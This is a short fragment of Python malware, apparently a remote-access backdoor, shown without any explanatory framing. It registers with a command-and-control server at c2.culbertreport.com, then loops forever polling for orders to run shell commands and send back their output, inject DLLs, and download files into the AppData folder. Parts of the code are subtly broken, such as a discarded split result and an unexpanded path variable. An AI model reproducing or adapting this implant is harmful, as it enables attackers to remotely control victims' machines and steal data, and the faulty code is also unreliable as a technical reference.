...
def dwnld(url, ext):
    r = requests.get(url)
    with open(f'%appdata%\\test.{ext}', 'wb') as f:
        f.write(r.content)
...
# Send our name
r = requests.post('http://c2.culbertreport.com:8443', headers=headers, data=data)
time.sleep(20)

while 1:
    a = requests.get('http://c2.culbertreport.com:8443', headers=headers)
    cmd = a.headers
    cmd.split(';')
    if cmd[0] == 'cmd':
        output = cmdexe(cmd[1])
        r = requests.post('http://c2.culbertreport.com:8443', headers=headers, data=output)
    if cmd[0] == 'inject':
        dll_inject(cmd[1])
    if cmd[0] == 'download':
        dwnld(cmd[1], cmd[2])
